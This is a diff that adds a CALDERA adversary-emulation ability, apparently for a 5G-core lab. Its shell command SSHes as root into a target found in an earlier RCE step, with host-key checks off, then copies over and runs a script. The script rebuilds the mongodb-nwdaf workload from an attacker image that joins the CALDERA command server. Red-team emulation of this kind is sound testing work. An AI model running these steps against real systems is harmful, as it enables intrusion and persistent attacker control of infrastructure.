@@ -1,0 +1,36 @@
+- id: 20000000-0000-0000-0000-000000000206
+  name: KC2-206 - Patch mongodb-nwdaf workload into child agent
+  description: Modify the mongodb-nwdaf workload so it restarts from the attacker image and joins CALDERA as a child agent.
+  tactic: execution
+  technique:
+    attack_id: T1610
+    name: Deploy Container
+  repeatable: false
+  singleton: true
+  platforms:
+    linux:
+      sh:
+        command: |
+          ENTRY='#{host.kc2.entry}';
+          PREV='#{kc2.205.done}';
+          mkdir -p "$DATA_PATH/KC2";
+          KC2_CHILD_IMAGE="${KC2_CHILD_IMAGE:-${REGISTRY_NAME:-registry}:${REGISTRY_PORT:-5000}/nwdaf:${IMAGE_VERSION:-2.0.2}}";
+          TARGET_FILE="$DATA_PATH/KC2/attackaddr";
+          {
+            test -s "$TARGET_FILE" || {
+              echo "Missing KC2 attack address: $TARGET_FILE. Run step 202 and inspect $DATA_PATH/KC2/rce-attack.log.";
+              exit 1;
+            };
+            TARGET="$(cat "$TARGET_FILE")";
+            ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" 'rm -rf /tmp/caldera-kc4-patch && mkdir -p /tmp/caldera-kc4-patch';
+            tar -C /opt/caldera/KC4 -cf - patch-mongodb-nwdaf.py lib | ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" 'tar -C /tmp/caldera-kc4-patch -xf -';
+            ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" "KC2_TARGET_NAMESPACE='${KC2_TARGET_NAMESPACE:-free5gc}' KC2_TARGET_STATEFULSET='${KC2_TARGET_STATEFULSET:-mongodb-nwdaf}' KC2_CHILD_GROUP='${KC2_CHILD_GROUP:-outside}' KC2_CHILD_ROLE='${KC2_CHILD_ROLE:-child}' KC2_CHILD_IMAGE='$KC2_CHILD_IMAGE' KC2_CONTAINERD_SOCKET='${KC2_CONTAINERD_SOCKET:-/run/containerd/containerd.sock}' CALDERA_URL='${CALDERA_URL:-http://caldera:8888}' REGISTRY_NAME='${REGISTRY_NAME:-registry}' REGISTRY_PORT='${REGISTRY_PORT:-5000}' IMAGE_VERSION='${IMAGE_VERSION:-2.0.2}' /usr/bin/env python3 /tmp/caldera-kc4-patch/patch-mongodb-nwdaf.py";
+          } > "$DATA_PATH/KC2/patch-mongodb-nwdaf.log" 2>&1 && echo kc2-206-done
+        timeout: 900
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: kc2.206.done
+        cleanup: ''
+  requirements:
+  - plugins.stockpile.app.requirements.paw_provenance:
+    - source: host.kc2.entry
